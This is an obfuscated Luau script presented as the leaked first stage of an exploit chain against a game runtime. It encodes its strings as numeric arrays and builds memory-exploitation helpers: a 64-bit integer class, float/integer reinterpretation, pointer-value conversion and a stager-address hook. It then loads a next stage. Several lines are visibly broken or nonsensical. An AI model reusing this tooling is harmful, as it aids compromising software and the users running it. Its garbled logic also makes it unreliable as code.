-- This script is apart of a Luau exploit chain, it should be handled with care and never run on a real game instance.
-- Leaked, deobfuscated and published by @thesavannahman.

-- // STAGE 1

local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function GlEPEhdxkcyrWhvJammWbcxGKQMTtjZOoxUgiYxLFSGLPVDMHSXxaxYojdTxzLxtgZRRjSUfEtsgdXhfTlmmndJVhYxpr(data)
	local m = string.sub(data, 0, 55)
	data = data:gsub(m, '')
	data = string.gsub(data, '[^' .. b .. '=]', '')
	return (data:gsub('.', function(x)
		if (x == '=') then
			return ''
		end
		local r, f = '', (b:find(x) - 1)
		for i = 6, 1, - 1 do
			r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0')
		end
		return r;
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if (# x ~= 8) then
			return ''
		end
		local c = 0
		for i = 1, 8 do
			c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0)
		end
		return string.char(c)
	end))
end
local function rand(length)
	local Aa = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	local result = "SUB-"
	for i = 1, length do
		local randomIndex = math.random(1, # Aa);
		result = result .. Aa:sub(randomIndex, randomIndex);
	end
	return result;
end
script.Name = rand(16)
function SGpwwOyJlwxjUSRKFSezuR(a)
	local b = GlEPEhdxkcyrWhvJammWbcxGKQMTtjZOoxUgiYxLFSGLPVDMHSXxaxYojdTxzLxtgZRRjSUfEtsgdXhfTlmmndJVhYxpr('kwYFpwebgYundtrzosobeFDYHzdPgcLismcTOazBMpPZAIPfoTSaQwm')
	for c in ipairs(a) do
		b = b .. string.char(a[c] / 105)
	end;
	return b
end;
local bit32 = bit32 or require(SGpwwOyJlwxjUSRKFSezuR({
	10290,
	11025,
	12180,
	5355,
	5250
}))
local function d()
	local e = {}
	local function f(g)
		local h = SGpwwOyJlwxjUSRKFSezuR({
			6825,
			6930,
			7035,
			7140,
			7245,
			7350,
			7455,
			7560,
			7665,
			7770,
			7875,
			7980,
			8085,
			8190,
			8295,
			8400,
			8505,
			8610,
			8715,
			8820,
			8925,
			9030,
			9135,
			9240,
			9345,
			9450,
			10185,
			10290,
			10395,
			10500,
			10605,
			10710,
			10815,
			10920,
			11025,
			11130,
			11235,
			11340,
			11445,
			11550,
			11655,
			11760,
			11865,
			11970,
			12075,
			12180,
			12285,
			12390,
			12495,
			12600,
			12705,
			12810,
			5040,
			5145,
			5250,
			5355,
			5460,
			5565,
			5670,
			5775,
			5880,
			5985,
			4515,
			4935
		})
		g = string.gsub(g, SGpwwOyJlwxjUSRKFSezuR({
			9555,
			9870
		}) .. h .. SGpwwOyJlwxjUSRKFSezuR({
			6405,
			9765
		}), SGpwwOyJlwxjUSRKFSezuR({}))
		return g:gsub(SGpwwOyJlwxjUSRKFSezuR({
			4830
		}), function(i)
			if i == SGpwwOyJlwxjUSRKFSezuR({
				6405
				}) then
				return SGpwwOyJlwxjUSRKFSezuR({})
			end;
			local e, j = SGpwwOyJlwxjUSRKFSezuR({}), h:find(i) - 1;
			for c = 6, 1, - 1 do
				e = e .. (j % 2 ^ c - j % 2 ^ (c - 1) > 0 and SGpwwOyJlwxjUSRKFSezuR({
					5145
				}) or SGpwwOyJlwxjUSRKFSezuR({
					5040
				}))
			end;
			return e
		end):gsub(SGpwwOyJlwxjUSRKFSezuR({
			3885,
			10500,
			3885,
			10500,
			3885,
			10500,
			3885,
			10500,
			3885,
			10500,
			3885,
			10500,
			3885,
			10500,
			3885,
			10500
		}), function(i)
			local e = 0;
			for c = 1, 8 do
				e = e + (i:sub(c, c) == SGpwwOyJlwxjUSRKFSezuR({
					5145
				}) and 2 ^ (8 - c) or 0)
			end;
			return string.char(e)
		end)
	end;
	local function c(k)
		if type(k) == SGpwwOyJlwxjUSRKFSezuR({
			11550,
			12285,
			11445,
			10290,
			10605,
			11970
			}) then
			return math.floor(k)
		end;
		return k
	end;
	e.U = c;
	local l = c(549755813887)
	local m = 127;
	local n = c(39)
	e.B = n;
	e.I = l;
	e.v = m;
	e.N = function(k)
		if nil == k then
			return SGpwwOyJlwxjUSRKFSezuR({
				11550,
				12285,
				11340,
				11340
			})
		end;
		return string.format(SGpwwOyJlwxjUSRKFSezuR({
			3885,
			12600
		}), k)
	end;
	local o = {}
	e.D = function(k)
		table.insert(o, k)
	end;
	local function p(q, r)
		return q + 4294967296 * r
	end;
	local function h(k)
		local s = string.pack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), k)
		local q, r = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), s)
		return q
	end;
	local function t(k)
		local s = string.pack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), k)
		local q, r = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), s)
		return r
	end;
	local function u(q, r)
		local s = string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), q, r)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), s)
	end;
	e.S = function(k)
		return bit32.band(k, 4294967295)
	end;
	e.T = p;
	e.P = function(k)
		local q, r = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), k))
		return p(q, r)
	end;
	e.C = h;
	e.V = t;
	e.F = function(k)
		return bit32.band(math.floor(k / 4294967296), 4294967295)
	end;
	e._ = function(k)
		return bit32.band(k, 4294967295)
	end;
	local v = {}
	e.q = function(k, w)
		return v.fromDouble(k):H(w):W()
	end;
	e.G = function(k, w)
		return v.fromDouble(k):H(w):W()
	end;
	e.J = function(k)
		local r = math.floor(k / 4294967296)
		local q = bit32.band(k, 4294967295)
		return u(q, r)
	end;
	e.K = function(k)
		return p(tonumber(bit32.band(k, 4294967295)), tonumber(bit32.rshift(k, 32)))
	end;
	e.O = function(k)
		local q = bit32.band(k, 4294967295)
		local r = bit32.band(math.floor(k / 4294967296), 4294967295)
		return r * 4294967296 + q
	end;
	e.X = function(k)
		local q, r = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), k))
		return r * 4294967296 + q
	end;
	e.Y = u;
	e.Z = function(x, y, z, A)
		return bit32.bor(bit32.lshift(x, 24), bit32.lshift(y, 16), bit32.lshift(z, 8), A)
	end;
	e.tt = function(k)
		local r = math.floor(k / 4294967296)
		local q = bit32.band(k, 4294967295)
		local B, C = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5250,
			7665,
			5250
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460
		}), q))
		local D, E = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5250,
			7665,
			5250
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460
		}), r))
		return string.char(bit32.band(B, 255), bit32.rshift(B, 8), bit32.band(C, 255), bit32.rshift(C, 8), bit32.band(D, 255), bit32.rshift(D, 8), bit32.band(E, 255), bit32.rshift(E, 8))
	end;
	e.nt = function(k)
		local F = f(k)
		local G = {}
		for w = 1, # F do
			G[w] = string.byte(F, w)
		end;
		return G
	end;
	e.rt = function(k)
		local G = {}
		for w = 1, # k do
			G[w] = string.byte(k, w)
		end;
		return G
	end;
	v.__index = v;
	function v.new(q, r)
		local self = setmetatable({}, v)
		self.it = bit32.band(q, 4294967295)
		self.et = bit32.band(r, 4294967295)
		return self
	end;
	function v.ut(k)
		return v.fromNumber(k)
	end;
	function v.ot(k)
		return v.fromBigInt(k)
	end;
	function v.st(k)
		return v.fromUnsigned(k)
	end;
	function v.L(k)
		return v.fromDouble(k)
	end;
	function v.ht(k)
		return v.fromInt32(k)
	end;
	function v:ct()
		return self:toNumber()
	end;
	function v:gt()
		return self:not_op()
	end;
	function v.fromNumber(k)
		return v.new(bit32.band(k, 4294967295), math.floor(k / 4294967296))
	end;
	function v.fromBigInt(k)
		return v.new(tonumber(bit32.band(k, 4294967295)), tonumber(bit32.rshift(k, 32)))
	end;
	function v.fromUnsigned(k)
		return v.new(bit32.band(k, 4294967295), math.floor(k / 4294967296))
	end;
	function v.fromDouble(k)
		return v.new(h(k), t(k))
	end;
	function v.fromInt32(k)
		local r = 0;
		if k < 0 then
			r = - 1
		end;
		return v.new(k, r)
	end;
	function v:toNumber()
		return 4294967296 * self.et + self.it
	end;
	function v:ft()
		return self.et > 127
	end;
	function v:wt(k)
		local w = bit32.band(math.floor(k / 4294967296), 4294967295)
		local H = bit32.band(k, 4294967295)
		return self.et == w and self.it == H
	end;
	function v:not_op()
		return v.new(bit32.bnot(self.it), bit32.bnot(self.et))
	end;
	function v:add(k)
		local w = self.it + k.it;
		local I = self.et + k.et;
		if w >= 4294967296 then
			I = I + 1
		end;
		return v.new(w, I)
	end;
	function v:H(k)
		return self:add(v.fromInt32(k))
	end;
	function v:lt(k)
		return self.it == k.it and self.et == k.et
	end;
	function v:bt(k)
		return self.it ~= k.it or self.et ~= k.et
	end;
	function v:sub(k)
		return self:add(k:Ut())
	end;
	function v:Bt(k)
		return self:add(v.fromInt32(k):Ut())
	end;
	function v:It(k)
		return v.new(bit32.band(self.it, k.it), bit32.band(self.et, k.et))
	end;
	function v:At(k)
		return v.new(bit32.bor(self.it, k.it), bit32.bor(self.et, k.et))
	end;
	function v:vt(k)
		return v.new(bit32.bxor(self.it, k.it), bit32.bxor(self.et, k.et))
	end;
	function v:Ut()
		return self:not_op():add(v.new(1, 0))
	end;
	function v:dt(k)
		if k >= 32 then
			error(SGpwwOyJlwxjUSRKFSezuR({
				12180,
				3360,
				6510,
				6405,
				3360,
				5355,
				5250
			}))
		end;
		local q = bit32.bor(bit32.rshift(self.it, k), bit32.lshift(self.et, 32 - k))
		local r = bit32.rshift(self.et, k)
		return v.new(q, r)
	end;
	function v:rshift(k)
		return self:dt(k)
	end;
	function v:toString()
		return SGpwwOyJlwxjUSRKFSezuR({})
	end;
	function v:yt()
		if self.et > m then
			error(SGpwwOyJlwxjUSRKFSezuR({
				12180,
				10920,
				11025,
				12075,
				4830,
				10605,
				12180,
				3360,
				6510,
				3360,
				11655
			}))
		end;
		return 4294967296 * self.et + self.it
	end;
	function v:Nt()
		return self.et * 4294967296 + self.it
	end;
	function v:Dt()
		return v.new(self.it, bit32.band(self.et, m))
	end;
	function v:St()
		return 4294967296 * bit32.band(self.et, m) + self.it
	end;
	function v:Tt()
		return v.new(self.it, bit32.band(self.et, m))
	end;
	function v:W()
		return u(self.it, self.et)
	end;
	function v:Et()
		return 0 == self.it and 0 == self.et
	end;
	function v:Pt()
		return self.it
	end;
	function v:toPointerValue()
		if self.et > m then
			error(SGpwwOyJlwxjUSRKFSezuR({
				12180,
				10920,
				11025,
				12075,
				4830,
				10605,
				12180,
				3360,
				6510,
				3360,
				11655
			}))
		end;
		local J = self.it + 4095;
		local w = self.et;
		if J >= 4294967296 then
			w = w + 1
		end;
		J = bit32.band(J, 4294963200)
		return 4294967296 * bit32.band(w, 4294967295) + J
	end;
	local K = v;
	local function L(k)
		local M = SGpwwOyJlwxjUSRKFSezuR({})
		for w = 1, # k do
			local a = string.byte(k, w)
			M = M .. string.char(bit32.band(a, 255))
			M = M .. string.char(bit32.rshift(a, 8))
		end;
		return M
	end;
	local function N(k)
		local M = SGpwwOyJlwxjUSRKFSezuR({})
		local O = # k;
		for c = 1, O, 2 do
			local q = string.byte(k, c)
			local r = c + 1 <= O and string.byte(k, c + 1) or 0;
			M = M .. string.char(bit32.bor(q, bit32.lshift(r, 8)))
		end;
		return M
	end;
	local function P(k)
		local w = L(k)
		local Q = w:find(SGpwwOyJlwxjUSRKFSezuR({
			9660,
			5040
		}))
		if Q then
			w = w:sub(1, Q - 1)
		end;
		return w
	end;
	local function R(k)
		local w = string.format(SGpwwOyJlwxjUSRKFSezuR({
			3885,
			5040,
			5250,
			12600
		}), k):lower()
		return w
	end;
	local function S(k)
		local T = bit32.band(k, 255)
		local U = bit32.band(bit32.rshift(k, 24), 255)
		local V = bit32.band(bit32.rshift(k, 16), 255)
		local b = SGpwwOyJlwxjUSRKFSezuR({
			3885,
			12285
		})
		b = b .. R(bit32.band(bit32.rshift(k, 8), 255))
		b = b .. R(T)
		b = b .. SGpwwOyJlwxjUSRKFSezuR({
			3885,
			12285
		})
		b = b .. R(U)
		b = b .. R(V)
		local function W(X)
			return X:gsub(SGpwwOyJlwxjUSRKFSezuR({
				3885,
				3885,
				12285,
				4200,
				3885,
				12600,
				3885,
				12600,
				3885,
				12600,
				3885,
				12600,
				4305
			}), function(Y)
				return string.char(tonumber(Y, 16))
			end)
		end;
		return W(b)
	end;
	local function Z(k)
		local q, r = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), k))
		return {
			r,
			q
		}
	end;
	e.Vt = v;
	e.Int64 = v;
	e.Ft = L;
	e.utf16Encode = L;
	e._t = N;
	e.utf16Decode = N;
	e.qt = P;
	e.decodeString = P;
	e.xt = R;
	e.byteToHex = R;
	e.Wt = S;
	e.intToUnicodeEscape = S;
	e.Ht = function(k, w)
		w = w / 2 + 1;
		local B = string.byte(k, w) or 0;
		local C = string.byte(k, w + 1) or 0;
		local D = string.byte(k, w + 2) or 0;
		local E = string.byte(k, w + 3) or 0;
		local FF = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5250
		}), k:sub(w, w + 1))
		local a0 = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5250
		}), k:sub(w + 2, w + 3))
		return 65536 * a0 + FF
	end;
	e.Lt = function(q, r)
		return u(q, r)
	end;
	e.Mt = function(q, r)
		local a1 = bit32.band(r, 4293918720)
		if a1 == 4293918720 then
			error(0)
		end;
		return u(q, r)
	end;
	e.Rt = function(k)
		local s = string.pack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), k)
		local G = {}
		for c = 1, 8 do
			G[c] = string.byte(s, c)
		end;
		return G
	end;
	e.jt = Z;
	e.doubleToUint32Pair = Z;
	e.kt = function(k)
		local a2 = Z(k)
		if # a2 >= 2 then
			if _G.StagerAddress then
				return _G.StagerAddress.new(a2[2], a2[1])
			end
		end;
		return nil
	end;
	e.zt = function(a3, w, a4)
		local a5 = bit32.band(a4, 4294967295)
		a3[w] = bit32.band(a5, 255)
		a3[w + 1] = bit32.band(bit32.rshift(a5, 8), 255)
		a3[w + 2] = bit32.band(bit32.rshift(a5, 16), 255)
		a3[w + 3] = bit32.band(bit32.rshift(a5, 24), 255)
		return w + 4
	end;
	e.Gt = function(a3, w)
		local A = a3[w] or 0;
		local z = a3[w + 1] or 0;
		local y = a3[w + 2] or 0;
		local x = a3[w + 3] or 0;
		return bit32.band(bit32.bor(A, bit32.lshift(z, 8), bit32.lshift(y, 16), bit32.lshift(x, 24)), 4294967295)
	end;
	e.Jt = function(k)
		local F = f(k)
		local w = F .. S(0)
		local M = SGpwwOyJlwxjUSRKFSezuR({})
		local O = # F;
		for c = 1, O, 2 do
			local a = string.byte(w, c) + (string.byte(w, c + 1) or 0) * 256;
			M = M .. string.char(bit32.band(a, 65535))
		end;
		return M
	end;
	e.Kt = function(k)
		local a6 = {}
		local a7 = 256;
		for c = 0, 255 do
			a6[c] = string.char(c)
		end;
		local a8 = SGpwwOyJlwxjUSRKFSezuR({})
		local a9 = SGpwwOyJlwxjUSRKFSezuR({})
		local M = SGpwwOyJlwxjUSRKFSezuR({})
		for c = 1, string.char(k) do
			local aa = k:sub(c, c)
			local a = string.byte(aa)
			if c == 1 then
				a8 = string.char(a)
				a9 = a8
			else
				local ab;
				if a6[a] then
					ab = a6[a]
				else
					if a ~= a7 then
						error(0)
					end;
					ab = a8 .. a8:sub(1, 1)
				end;
				a9 = a9 .. ab;
				a6[a7] = a8 .. ab:sub(1, 1)
				a7 = a7 + 1;
				if a7 == 55296 then
					a7 = 57344
				end;
				a8 = ab
			end
		end;
		return N(a9)
	end;
	e.Qt = function(k)
		local w = k:sub(1, 1)
		w = w .. SGpwwOyJlwxjUSRKFSezuR({
			9660,
			5040
		})
		while # w % 4 ~= 0 do
			w = w .. SGpwwOyJlwxjUSRKFSezuR({
				9660,
				5040
			})
		end;
		return N(w)
	end;
	e.Xt = function(a3, w, a4)
		local ac = a4;
		while true do
			local ad = ac.it % 128;
			ac = ac:sub(v.fromInt32(ad))
			if ac.et == 0 and ac.it == 0 then
				a3[w] = ad;
				w = w + 1;
				if bit32.band(ad, 128) == 0 then
					break
				end
			else
				ad = bit32.bor(ad, 128)
			end;
			a3[w] = ad;
			w = w + 1;
			ac = ac:rshift(7)
			if bit32.band(ad, 128) == 0 then
				break
			end
		end
	end;
	e.Yt = function(a3, w)
		local M = 0;
		local ae = 0;
		local af = w;
		repeat
			local ad = a3[w]
			M = M + bit32.lshift(bit32.band(ad, 127), ae)
			ae = ae + 7;
			w = w + 1
		until bit32.band(a3[w - 1], 128) == 0;
		return {
			Zt = M,
			[SGpwwOyJlwxjUSRKFSezuR({
				3780,
				12180
			})] = w - af
		}
	end;
	e.tn = function()
		error(SGpwwOyJlwxjUSRKFSezuR({
			12180,
			10920,
			11970,
			11655,
			12495,
			7245,
			11970,
			11970,
			11655,
			11970
		}))
	end;
	local function ag(k)
		return bit32.band(k, tonumber(l))
	end;
	local function ah(ai)
		local self = setmetatable({}, ai)
		return self
	end;
	local function aj(k)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			11025,
			5250
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			11025,
			5250
		}), k))
	end;
	local function ak(k)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5250
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5250
		}), k))
	end;
	local function al(k)
		if type(k) == SGpwwOyJlwxjUSRKFSezuR({
			12180,
			10185,
			10290,
			11340,
			10605
			}) or type(k) == SGpwwOyJlwxjUSRKFSezuR({
				11550,
				12285,
				11445,
				10290,
				10605,
				11970
			}) and k > 4294967295 then
			return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
				7665,
				5460
			}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
				7665,
				5880
			}), k))
		else
			return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
				7665,
				5460
			}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
				7665,
				5460
			}), k))
		end
	end;
	local function am(k, w)
		local s = string.pack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), k)
		local q, r = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), s)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), w, r))
	end;
	local function an(k, w)
		local s = string.pack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), k)
		local q, r = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), s)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), q, w))
	end;
	local function ao(k)
		local G = SGpwwOyJlwxjUSRKFSezuR({})
		for w = 1, 4 do
			local a = string.byte(k, w) or 0;
			G = G .. string.pack(SGpwwOyJlwxjUSRKFSezuR({
				7665,
				5250
			}), a)
		end;
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), G)
	end;
	local function ap(k)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			10710
		}), k))
	end;
	local function aq(k)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			10500
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), k))
	end;
	local function ar(k, w)
		local s = string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), k)
		local h = {
			string.byte(s, 1, 8)
		}
		h[1] = tonumber(w)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), string.char(unpack(h)))
	end;
	local function as(k, w)
		local s = string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), k)
		local q, r = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), s)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), tonumber(w), r))
	end;
	local function at(k, w)
		local s = string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460
		}), k)
		local h = {
			string.byte(s, 1, 4)
		}
		h[1] = tonumber(w)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460
		}), string.char(unpack(h)))
	end;
	local function au(k, w)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460
		}), tonumber(w)))
	end;
	local function av(k)
		local q = bit32.band(k, 4294967295)
		local r = math.floor(k / 4294967296)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), q, r))
	end;
	local function aw(k, w)
		local s = string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), k)
		local q, r = string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), s)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5460,
			7665,
			5460
		}), tonumber(w), r))
	end;
	local function ax(k)
		return string.unpack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), string.pack(SGpwwOyJlwxjUSRKFSezuR({
			7665,
			5880
		}), k))
	end;
	e.nn = am;
	e.An = ag;
	e.vn = function(k)
		return ag(k) ~= k
	end;
	return e
end;
local function ay(az)
	if not bit32 then
		error(SGpwwOyJlwxjUSRKFSezuR({
			12705,
			11655,
			12285,
			3360,
			11550,
			10605,
			10605,
			10500,
			3360,
			12180,
			10920,
			10605,
			3360,
			10290,
			11025,
			12180,
			5355,
			5250,
			3360,
			11340,
			11025,
			10290,
			11970,
			10185,
			11970,
			12705
		}))
	end;
	local aA = d()
	if not az and az.debug then
		print(SGpwwOyJlwxjUSRKFSezuR({
			10710,
			10185,
			11025,
			11340,
			10605,
			10500
		}))
	end;
	return aA
end;
local aB, aC = pcall(ay({
	debug = true
}))
if aB then
	local success, err = pcall(function() require(script.Parent.B) end)
	if success then return true else warn(err) return false end
else
	warn(SGpwwOyJlwxjUSRKFSezuR({
		7245,
		11970,
		11970,
		6090,
		3360
	}) .. aC)
end
return true
